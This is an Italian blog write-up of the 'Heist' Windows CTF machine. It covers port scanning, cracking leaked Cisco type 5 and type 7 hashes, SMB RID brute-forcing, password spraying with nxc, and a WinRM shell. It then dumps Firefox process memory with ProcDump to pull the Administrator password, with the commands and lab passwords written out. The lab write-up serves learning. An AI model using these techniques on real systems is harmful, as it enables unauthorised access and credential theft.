+++
date = '2026-08-25T22:50:38+02:00'
draft = false
title = 'Heist Writeup IT'
+++
**Autore**: **`joy.scd01`**

**Data**: **`31/12/2025`**

![pwn.png](/images/imgs_heist/pwn.png)

---
# Introduzione

**_Heist_** è una macchina **Windows** di livello **Easy** che evidenzia i pericoli legati all'esposizione di file di configurazione e a una sbagliata gestione delle password.

L'accesso iniziale prevede l'enumerazione di un'applicazione web per scoprire una configurazione di un router **Cisco** esposta, contenente hash di **tipo 5** e **tipo 7**. Dopo aver craccato questi hash, ho sfruttato il **Bruteforcing** dei **RID SMB** per enumerare gli utenti di dominio validi ed eseguito un attacco di **password spraying** per ottenere l'accesso.
La fase di privilege escalation si concentra sull'analisi della memoria in post-exploitation, utilizzando **ProcDump** per estrarre le credenziali in chiaro dell'**Administrator** direttamente da un processo del browser web in esecuzione.

---
# Tecniche Utilizzate

- **Web Enumeration & Information Disclosure**

- **Password Cracking (Cisco Type 5 & Type 7)**

- **SMB RID Bruteforcing**

- **Password Spraying**

- **Process Memory Dumping**

# Enumerazione

## nmap

Scansione iniziale su tutte le porte:

```bash
nmap -p- heist -Pn
```

```text
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
445/tcp   open  microsoft-ds
5985/tcp  open  wsman
49669/tcp open  unknown
```

Scansione mirata con script e rilevamento dei servizi:

```bash
nmap -sC -sV heist -Pn
```

```text
PORT     STATE SERVICE       REASON          VERSION
80/tcp   open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
| http-title: Support Login Page
|_Requested resource was login.php
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
445/tcp  open  microsoft-ds? syn-ack ttl 127
5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_clock-skew: 0s
```

## Enumerazione Web

Navigando sulla porta 80, ho trovato un **Support Login Page** che consentiva l'accesso come utente "**Guest**".

![web1.png](/images/imgs_heist/web1.png)

All'interno del portale, era presente una chat tra gli utenti **Hazard** e **Support Admin** che discutevano di problemi legati ad un router **Cisco**.

![attach.png](/images/imgs_heist/attach.png)

In allegato alla conversazione c'era un file di configurazione che esponeva informazioni altamente sensibili, tra cui credenziali utente e **hash Cisco**:

![secrets.png](/images/imgs_heist/secrets.png)

# Accesso Iniziale

Per procedere, avevo bisogno di craccare gli hash scoperti. Per l'hash **Cisco Type 5**, ho utilizzato **John the Ripper**:

```bash
john type5 --wordlist=/usr/share/wordlists/rockyou.txt
```

![john.png](/images/imgs_heist/john.png)

Per gli hash di **Tipo 7**, ho utilizzato un **decrypter online** specifico per **Cisco Type 7**:

- **https://www.firewall.cx/cisco/cisco-routers/cisco-type7-password-crack.html**

recuperando due password aggiuntive:

```text
0242114B0E143F015F5D1E161713 = Q4)sJu\Y8qz*A3?d

02375012182C1A1D751618034F36415408 = $uperP@ssword
```

![cisco1.png](/images/imgs_heist/cisco1.png)

![cisco2.png](/images/imgs_heist/cisco2.png)

Poiché l'username **`hazard`** era esplicitamente menzionato nella chat web, ho tentato di validare queste credenziali tramite **WinRM**, senza successo.
Anche il controllo delle **share SMB** non ha prodotto risultati interessanti.

Affidandomi alla mia metodologia standard per **SMB**, ho eseguito un attacco di **SMB RID Bruteforce** contro la macchina:

```bash
nxc smb heist -u hazard -p stealth1agent --rid-brute
```

![brute.png](/images/imgs_heist/brute.png)

Ho recuperato una lista di utenti, l'ho salvata in **`users.txt`** e ho creato un file **`passwords.txt`** contenente le tre password craccate. Successivamente, ho eseguito un attacco di **Password Spraying**:

```bash
nxc smb heist -u users.txt -p passwords.txt --continue-on-success
```

![spray1.png](/images/imgs_heist/spray1.png)

Questo attacco ha associato con successo l'utente **chase** alla password **`Q4)sJu\Y8qz*A3?d`**. Ho validato le credenziali su **WinRM** e ho ottenuto la mia shell iniziale:

```bash
evil-winrm -i heist -u chase -p 'Q4)sJu\Y8qz*A3?d'
```

![winrm.png](/images/imgs_heist/winrm.png)

**User flag** in: **`C:\Users\Chase\Desktop\user.txt`**.

![userf.png](/images/imgs_heist/userf.png)

---
# Privilege Escalation

Sul desktop di **Chase**, ho trovato un file **`todo.txt`** con il seguente contenuto:

![todo.png](/images/imgs_heist/todo.png)

Dato che "**checking the issues list**" implica fortemente l'interazione con un'applicazione web, ho controllato i processi in esecuzione per vedere se ci fosse un browser attivo in background:

```PowerShell
get-process firefox
```

![process.png](/images/imgs_heist/process.png)

L'output ha confermato l'esecuzione di multipli processo **`firefox.exe`**. Poiché i browser web spesso memorizzano dati sensibili (come password in chiaro derivanti da recenti richieste **POST**) in memoria, ho deciso di dumparli.

Ho caricato **ProcDump (Sysinternals)** sulla macchina target utilizzando la funzione di upload di **Evil-WinRM**, e l'ho eseguito contro il **PID** con la memory footprint più alta:

```PowerShell
.\procdump64.exe -ma 6996 -accepteula
```

![procdump.png](/images/imgs_heist/procdump.png)

![dump.png](/images/imgs_heist/dump.png)

Dopo aver scaricato il file di dump sulla mia macchina locale, ho ispezionato una richiesta di login precedentemente catturata tramite **Burp Suite**, notando che il parametro della password si chiamava **`login_password`**.

Ho cercato nel file di dump le stringhe contenenti questo specifico parametro:

```bash
strings firefox.exe_251231_195159.dmp | grep login_password
```

![pass.png](/images/imgs_heist/pass.png)

Questo mi ha permesso di estrarre la password in chiaro **`4dD!5}x/re8]FBuZ`** per l'account **`Administrator`**. Ho validato le credenziali ed effettuato l'accesso alla macchina come **Administrator**:

```bash
evil-winrm -i heist -u Administrator -p '4dD!5}x/re8]FBuZ'
```

![rootf.png](/images/imgs_heist/rootf.png)

**Root flag** in: **`C:\Users\Administrator\Desktop\root.txt`**.

---
# Considerazioni Finali

Ho trovato questa macchina decisamente in linea con il livello di difficoltà **Easy**. Una volta acquisita familiarità con il vettore di attacco **ProcDump** e l'analisi della memoria, il percorso di escalation risulta molto lineare. Tuttavia, la necessità di passare dall'enumerazione web al cracking degli hash, seguita dall'enumerazione SMB e dalla memory forensics, offre un'ottima curva di apprendimento.

**Fonti**:

- **Cisco Type 7 Password Decrypter: https://www.firewall.cx/cisco/cisco-routers/cisco-type7-password-crack.html**